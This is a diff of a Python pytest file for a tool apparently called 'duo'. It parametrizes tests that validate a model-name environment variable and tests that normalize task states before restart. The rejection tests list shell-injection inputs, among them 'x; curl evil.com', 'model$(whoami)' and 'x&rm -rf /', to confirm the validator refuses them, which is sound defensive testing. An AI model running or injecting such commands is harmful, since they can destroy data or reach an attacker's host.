@@ -1876,23 +1876,40 @@ class TestGetCopilotModel:
         monkeypatch.setattr("duo.commander.get_config", lambda k: "custom-model")
         assert _get_copilot_model() == "custom-model"
 
-    def test_env_var_invalid_chars_rejected(self, monkeypatch: pytest.MonkeyPatch):
-        """Env var with shell-unsafe chars is rejected, falls back to config."""
-        monkeypatch.setenv("DUO_COPILOT_MODEL", "x; curl evil.com")
+    @pytest.mark.parametrize(
+        "bad_model",
+        [
+            pytest.param("x; curl evil.com", id="semicolon"),
+            pytest.param("model$(whoami)", id="command-sub"),
+            pytest.param("a b c", id="spaces"),
+            pytest.param("x|y", id="pipe"),
+            pytest.param("a" * 65, id="too-long-65"),
+            pytest.param("x&rm -rf /", id="ampersand"),
+        ],
+    )
+    def test_env_var_invalid_rejected(
+        self, monkeypatch: pytest.MonkeyPatch, bad_model: str
+    ):
+        """Env var with unsafe chars or excessive length falls back to config."""
+        monkeypatch.setenv("DUO_COPILOT_MODEL", bad_model)
         monkeypatch.setattr("duo.commander.get_config", lambda k: "safe-model")
         assert _get_copilot_model() == "safe-model"
 
-    def test_env_var_too_long_rejected(self, monkeypatch: pytest.MonkeyPatch):
-        """Env var exceeding 64 chars is rejected, falls back to config."""
-        monkeypatch.setenv("DUO_COPILOT_MODEL", "a" * 65)
-        monkeypatch.setattr("duo.commander.get_config", lambda k: "safe-model")
-        assert _get_copilot_model() == "safe-model"
-
-    def test_env_var_exactly_64_chars_accepted(self, monkeypatch: pytest.MonkeyPatch):
-        """Env var at exactly 64 chars is accepted."""
-        model = "a" * 64
-        monkeypatch.setenv("DUO_COPILOT_MODEL", model)
-        assert _get_copilot_model() == model
+    @pytest.mark.parametrize(
+        "good_model",
+        [
+            pytest.param("claude-opus-4.6", id="default"),
+            pytest.param("gpt-4o", id="gpt"),
+            pytest.param("a" * 64, id="exact-64-chars"),
+            pytest.param("claude.sonnet-3.5_v2", id="dots-underscores"),
+        ],
+    )
+    def test_env_var_valid_accepted(
+        self, monkeypatch: pytest.MonkeyPatch, good_model: str
+    ):
+        """Valid model names from env var are accepted."""
+        monkeypatch.setenv("DUO_COPILOT_MODEL", good_model)
+        assert _get_copilot_model() == good_model
 
 
 # ---------------------------------------------------------------------------
@@ -4291,29 +4308,38 @@ class TestTransitionReturnValueGuards:
 class TestNormalizeForRestart:
     """normalize_for_restart() transitions active states to FAILED for restart."""
 
-    def test_directly_restartable_states_return_true(self):
+    @pytest.mark.parametrize(
+        "status_name",
+        ["created", "queued", "blocked", "failed", "session_starting"],
+    )
+    def test_directly_restartable_states_return_true(self, status_name: str):
         """States already legal for SESSION_STARTING need no normalization."""
         from duo.commander import normalize_for_restart
 
-        for status_name in (
-            "created",
-            "queued",
-            "blocked",
-            "failed",
-            "session_starting",
-        ):
-            task = _make_task(f"norm-{status_name}")
-            task.status = TaskStatus(status_name)
-            save_task(task)
-            assert normalize_for_restart(task) is True
-            assert task.status == TaskStatus(status_name)
+        task = _make_task(f"norm-{status_name}")
+        task.status = TaskStatus(status_name)
+        save_task(task)
+        assert normalize_for_restart(task) is True
+        assert task.status == TaskStatus(status_name)
 
-    def test_active_state_normalized_to_failed(self):
-        """Active states like RUNNING are moved to FAILED."""
+    @pytest.mark.parametrize(
+        "status",
+        [
+            TaskStatus.PROMPT_SENT,
+            TaskStatus.ACKED,
+            TaskStatus.RUNNING,
+            TaskStatus.RESULT_REPORTED,
+            TaskStatus.VERIFYING,
+            TaskStatus.CORRECTING,
+        ],
+        ids=lambda s: s.value,
+    )
+    def test_active_state_normalized_to_failed(self, status: TaskStatus):
+        """Active states are moved to FAILED before restart."""
         from duo.commander import normalize_for_restart
 
-        task = _make_task("norm-running")
-        task.status = TaskStatus.RUNNING
+        task = _make_task(f"norm-{status.value}")
+        task.status = status
         save_task(task)
         assert normalize_for_restart(task) is True
         assert task.status == TaskStatus.FAILED
